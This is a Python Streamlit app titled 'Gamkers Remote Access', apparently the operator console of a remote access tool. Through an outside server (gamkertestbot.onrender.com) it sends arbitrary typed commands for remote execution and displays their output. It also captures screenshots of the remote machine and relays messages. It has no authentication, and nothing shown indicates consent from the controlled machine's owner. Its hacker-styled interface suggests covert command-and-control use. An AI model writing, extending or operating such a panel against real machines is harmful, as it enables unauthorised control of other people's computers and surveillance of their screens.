import streamlit as st
import requests
from streamlit_lottie import st_lottie
import streamlit_shadcn_ui as ui
from streamlit_extras.stylable_container import stylable_container
import base64
from PIL import Image
import io
from datetime import datetime

# Custom CSS for black and green theme
st.set_page_config(page_title="Gamkers Remote Access", page_icon="🖥️", layout="wide")

def load_lottie(url):
    try:
        response = requests.get(url)
        return response.json() if response.status_code == 200 else None
    except Exception:
        return None

# Dark theme CSS
st.markdown("""
<style>
.stApp {
    background-color: black;
    color: #00FF00;
}
.stTextInput > div > div > input {
    color: #00FF00;
    background-color: #111;
    border: 1px solid #00FF00;
}
.stButton > button {
    color: black;
    background-color: #00FF00;
    border: none;
}
.stMarkdown {
    color: #00FF00;
}
.stRadio > div {
    color: #00FF00 !important;
}
.stRadio > div > label {
    color: #00FF00 !important;
}
</style>
""", unsafe_allow_html=True)

# API Configuration
API_URL = "https://gamkertestbot.onrender.com"

def main():
    # Sidebar Navigation
    with st.sidebar:
        selected_page = st.radio("Select Tool", 
                                 ["Commands", "Screenshot", "Message Center"])

    if selected_page == "Commands":
        commands_page()
    elif selected_page == "Screenshot":
        screenshot_page()
    elif selected_page == "Message Center":
        message_center_page()

def commands_page():
    st.title("🖥️ Remote Command Execution")
    
    # Lottie Animation
    lottie_url = "https://assets5.lottiefiles.com/packages/lf20_V9t630.json"
    lottie_json = load_lottie(lottie_url)
    if lottie_json:
        st_lottie(lottie_json, height=200, key="command_animation")
    
    # Command Input
    with stylable_container(
        key="command_input_container",
        css_styles="""
        {
            background-color: #111;
            border: 1px solid #00FF00;
            border-radius: 10px;
            padding: 20px;
        }
        """,
    ):
        command = st.text_input("Enter Command", placeholder="Type remote command here...")
        
        col1, col2 = st.columns(2)
        with col1:
            if st.button("Execute Command", type="primary"):
                if command:
                    response = requests.post(f"{API_URL}/execute_command", json={"command": command})
                    if response.status_code == 200:
                        st.success("Command executed successfully!")
                        output = response.json().get('output', 'No output')
                        st.code(output, language='bash')
                    else:
                        st.error("Failed to execute command")

def screenshot_page():
    st.title("📸 Remote Screenshot")
    
    with stylable_container(
        key="screenshot_container",
        css_styles="""
        {
            background-color: #111;
            border: 1px solid #00FF00;
            border-radius: 10px;
            padding: 20px;
        }
        """,
    ):
        if st.button("Capture Screenshot"):
            response = requests.get(f"{API_URL}/take_screenshot")
            if response.status_code == 200:
                screenshot_data = response.json().get('screenshot')
                if screenshot_data:
                    # Decode base64 image
                    img_bytes = base64.b64decode(screenshot_data)
                    img = Image.open(io.BytesIO(img_bytes))
                    st.image(img, caption="Remote Screenshot", use_column_width=True)
                else:
                    st.error("No screenshot received")
            else:
                st.error("Failed to capture screenshot")

def message_center_page():
    st.title("💬 Message Center")
    
    # Message Input
    with stylable_container(
        key="message_container",
        css_styles="""
        {
            background-color: #111;
            border: 1px solid #00FF00;
            border-radius: 10px;
            padding: 20px;
        }
        """,
    ):
        message = st.text_input("Send Message")
        
        if st.button("Send Message"):
            if message:
                response = requests.post(
                    f"{API_URL}/send_message",
                    json={"message": message, "type": "text"}
                )
                if response.status_code == 200:
                    st.success("Message sent successfully!")

        # Refresh Messages
        if st.button("Refresh Messages"):
            response = requests.get(f"{API_URL}/get_messages")
            if response.status_code == 200:
                messages = response.json()
                for msg in reversed(messages):
                    with st.container():
                        ui.metric_card(
                            title=f"Message at {datetime.fromtimestamp(msg['timestamp']).strftime('%H:%M:%S')}",
                            content=msg.get('message', 'No message'),
                            description=msg.get('type', 'Unknown')
                        )
                        st.divider()

if __name__ == "__main__":
    main()
